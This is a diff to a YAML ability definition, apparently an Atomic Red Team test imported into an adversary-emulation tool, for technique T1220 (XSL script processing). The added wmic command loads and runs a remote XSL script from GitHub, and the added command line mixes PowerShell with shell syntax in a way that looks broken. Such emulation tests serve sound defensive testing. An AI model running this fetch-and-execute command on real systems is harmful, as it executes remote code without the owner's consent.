@@ -9,7 +9,9 @@
   platforms:
     windows:
       sh:
-        command: wmic process list /FORMAT:"https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1220/src/wmicscript.xsl"
+        command: 'if (Test-Path "$env:SystemRoot\System32\wbem\wmic.exe") {exit 0}
+          else {exit 1}; then : ; else DISM /Online /Add-Capability /CapabilityName:WMIC~~~~;
+          fi; wmic process list /FORMAT:"https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1220/src/wmicscript.xsl"'
   plugin: atomic
   singleton: false
   repeatable: true
@@ -17,8 +19,8 @@
   privilege: ''
   buckets:
   - t1220
-  - atomic-red-team
   - stealth
+  - atomic-red-team
   author: Atomic Red Team
   additional_info:
     input_arguments:
@@ -30,6 +32,19 @@
         description: WMI command to execute using wmic.exe
         type: string
         default: process list
+    dependencies:
+    - description: 'wmic.exe must be present on the system. It is disabled by default
+        on Windows 11, version 24H2 and later, and removed when upgrading to version
+        25H2.
+
+        '
+      prereq_command: 'if (Test-Path "$env:SystemRoot\System32\wbem\wmic.exe") {exit
+        0} else {exit 1}
+
+        '
+      get_prereq_command: 'DISM /Online /Add-Capability /CapabilityName:WMIC~~~~
+
+        '
     technique_created: '2018-10-17T00:14:20.652Z'
     atomic_guid: 7f5be499-33be-4129-a560-66021f379b9b
-    import_timestamp: '2026-08-17T02:58:42.307347Z'
+    import_timestamp: '2026-08-18T02:56:40.548455Z'
